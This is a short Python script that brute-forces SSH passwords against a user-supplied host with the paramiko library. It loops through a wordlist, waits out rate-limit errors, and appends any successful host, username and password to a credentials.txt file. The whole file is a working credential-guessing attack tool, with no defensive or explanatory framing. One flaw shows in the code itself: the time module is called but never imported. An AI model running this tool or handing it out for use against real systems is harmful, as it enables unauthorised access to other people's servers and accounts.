import os
import sys
import socket
import paramiko
from pathlib import Path

def brute_force_ssh(target, user, wordlist_path):
    """Attempts to brute force SSH login using a wordlist."""
    port = 22
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(wordlist_path) as file:
        passwords = file.read().splitlines()

    for password in passwords:
        try:
            ssh.connect(hostname=target, username=user, password=password, port=port, timeout=3)
        except socket.timeout:
            print(f"\nConnection timed out for host: {target}")
            continue
        except paramiko.AuthenticationException:
            print(f"[ATTEMPT] host: {target} - login: {user} - password: {password}")
        except paramiko.SSHException:
            print("Too many requests. Waiting for 2 minutes.")
            time.sleep(120)
            continue
        else:
            print(f"\n[Success] Host: {target} Login: {user} Password: {password}")
            with open("credentials.txt", "a") as file:
                file.write(f'Host: {target}, Login: {user}, Password: {password}\n')
            break
    else:
        print(f"No valid credentials found in {wordlist_path}")

def main():
    """Main function to gather inputs and start brute force."""
    os.system('clear')

    try:
        target = input('Enter Target Address > ')
        user = input('Enter Username > ')
        wordlist_path = Path(input('Enter path to Wordlist > '))

        if not wordlist_path.exists():
            print('The specified wordlist file does not exist.')
            sys.exit()
        
        brute_force_ssh(target, user, wordlist_path)

    except KeyboardInterrupt:
        print('\nExiting due to user interruption.\n')
        sys.exit()

if __name__ == "__main__":
    main()
